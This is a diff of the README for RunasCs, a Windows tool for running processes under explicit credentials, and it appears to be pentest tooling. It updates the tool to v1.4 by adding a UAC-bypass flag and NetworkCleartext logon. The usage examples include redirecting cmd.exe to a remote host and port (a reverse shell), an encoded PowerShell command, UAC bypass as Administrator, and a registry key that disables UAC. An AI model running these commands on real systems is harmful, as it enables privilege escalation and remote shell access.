@@ -3,20 +3,21 @@
 ----
 
 *RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
-This tool is an improved (from a pentest perspective) and open version of windows builtin *runas.exe* that solves some limitations:
+This tool is an improved and open version of windows builtin *runas.exe* that solves some limitations:
 
 * Allows explicit credentials
 * Works both if spawned from interactive process and from service process
 * Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
 * Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
-* Allows to specify the logon type, i.e. network logon 3 (no *UAC* limitations)
+* Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no *UAC* limitations)
+* Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
 * Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
 * It's Open Source :)
 
 *RunasCs* has an automatic detection to determine the best create process function for every contexts.
 Based on the process caller token permissions, it will use one of the create process function in the following preferred order:
 
-1. ``CreateProcessAsUser()``
+1. ``CreateProcessAsUserW()``
 2. ``CreateProcessWithTokenW()``
 3. ``CreateProcessWithLogonW()``
 
@@ -33,12 +34,10 @@ Based on the process caller token permissions, it will use one of the create pro
 ----
 
 ```console
-C:\ProgramData>.\RunasCs_net2.exe --help
-
-RunasCs v1.3 - @splinter_code
+RunasCs v1.4 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile] [--bypass-uac]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -54,18 +53,18 @@ Positional arguments:
                             commandline for the process if process_timeout=0
 Optional arguments:
     -d, --domain domain
-                            domain of the user, if in a domain.
+                            domain of the user, if in a domain. 
                             Default: ""
     -f, --function create_process_function
                             CreateProcess function to use. When not specified
                             RunasCs determines an appropriate CreateProcess
                             function automatically according to your privileges.
-                            0 - CreateProcessAsUserA
+                            0 - CreateProcessAsUserW
                             1 - CreateProcessWithTokenW
                             2 - CreateProcessWithLogonW
     -l, --logon-type logon_type
                             the logon type for the spawned process.
-                            Default: "3"
+                            Default: "8" - NetworkCleartext
     -r, --remote host:port
                             redirect stdin, stdout and stderr to a remote host.
                             Using this option sets the process timeout to 0.
@@ -86,6 +85,10 @@ Optional arguments:
                             Compatible only with -f flags:
                                 1 - CreateProcessWithTokenW
                                 2 - CreateProcessWithLogonW
+    -b, --bypass-uac     
+                            if this flag is specified RunasCs will try a UAC
+                            bypass to spawn a process without token limitation
+                            (not filtered).
 
 Examples:
     Run a command as a specific local user
@@ -96,17 +99,26 @@ Examples:
         RunasCs.exe user1 password1 "%COMSPEC% powershell -enc..." -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
-    Run a command simulating the /netonly flag of runas.exe
+    Run a command simulating the /netonly flag of runas.exe 
         RunasCs.exe user1 password1 whoami -d domain -l 9
+    Run a command as an Administrator bypassing UAC
+        RunasCs.exe adm1 password1 "whoami /priv" --bypass-uac
 ```
 
 The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
-The default logon type is 3 (*Network_Logon*). If you set *Interactive* (2) logon type you will face some *UAC* restriction problems.
+The default logon type is 8 (*NetworkCleartext*). 
+
+**NetworkCleartext** logon type is the one with widest permissions as it doesn't get filtered by UAC in local tokens and still allows
+ authentications over the Network as it stores credentials in the authentication package.
+
+If you set *Interactive* (2) logon type you will face some *UAC* restriction problems.
 You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:
 
 ```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
 ```
+
+Otherwise, you can try the flag **--bypass-uac** for an attempt in bypassing the token filtered limitation.
 
 By default, the calling process (*RunasCs*) will wait until the end of the execution of the spawned process and will use
 ``cmd.exe`` to manage *stdout* and *stderr*. If you need to spawn a background or async process, i.e. spawning a reverse shell,
@@ -131,3 +143,4 @@ and *RunasCs* won't wait for the end of the execution.
 
 * [@decoder](https://github.com/decoder-it)
 * [@qtc-de](https://github.com/qtc-de)
+* [@winlogon0](https://twitter.com/winlogon0)
